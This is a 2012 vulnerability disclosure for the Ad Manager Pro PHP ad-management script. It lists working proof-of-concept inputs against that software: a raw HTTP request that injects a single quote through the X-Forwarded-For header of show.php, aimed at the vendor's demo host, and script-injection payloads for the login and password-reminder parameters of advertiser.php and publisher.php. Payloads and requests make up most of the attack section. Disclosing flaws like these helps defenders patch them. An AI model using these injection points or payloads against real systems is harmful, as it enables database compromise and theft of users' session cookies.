@@ -1,0 +1,53 @@
+-----------------------------------------------------------
+Ad Manager Pro
+Bug discovered by Yakir Wizman
+Date 24/08/2012
+Vendor Homepage - http://www.phpwebscripts.com/ad-manager-pro/
+Demo - http://www.scripts-demo.com/admanagerpro/
+ISRAEL
+-----------------------------------------------------------
+       Author will be not responsible for any damage.
+-----------------------------------------------------------
+
+About the Application:
+-----------------------------------------------------------
+Ad Manager Pro is the most complete ad management solution available. It's a very flexible system, you can use it for one or more of these purposes:
+
+* Manage ads on your site(s)
+* Sell impressions and/or clicks to advertisers
+* Purchase impressions and/or clicks from publishers
+
+
+Proof Of Conecpt
+-----------------------------------------------------------
+1). SQL Injection (Severity is high)
+Vulnerable URL	: http://server/admanagerpro/show.php
+HTTP header		: X-Forwarded-For
+Injected 		: '
+
+Request:
+GET /admanagerpro/show.php?z=14&w=0&pl=0&ad_type=0&top_space=0&shape=0&c_border=0&c_background=0&page_background=0&c_text1=0&c_text2=0&c_text3=0&c_text4=0&c_text5=0&c_text6=0&c_text7=0&c_text8=0&c_text9=0&c_text10=0&code=1345745191215 HTTP/1.0
+Cookie: PHPSESSID=ni77ng3i0477i55poipsbnhs20
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+Host: www.scripts-demo.com
+X-Forwarded-For: '
+
+
+2). Cross-Site Scripting (Severity is Medium)
+Vulnerable URL	: http://server/admanagerpro/advertiser.php?action=user_login
+Parameters		: username, password, image_control
+Injected 		: "/><script>alert(document.cookie)</script>
+
+Vulnerable URL	: http://server/admanagerpro/advertiser.php?action=password_reminded
+Parameter		: email
+Injected 		: 1337@31337.com"/><script>alert(document.cookie)</script>
+
+Vulnerable URL	: http://server/admanagerpro/publisher.php?action=user_login
+Parameters		: username, password, image_control
+Injected 		: "/><script>alert(document.cookie)</script>
+
+Vulnerable URL	: http://server/admanagerpro/publisher.php?action=password_reminded
+Parameter		: email
+Injected 		: 1337@31337.com"/><script>alert(document.cookie)</script>
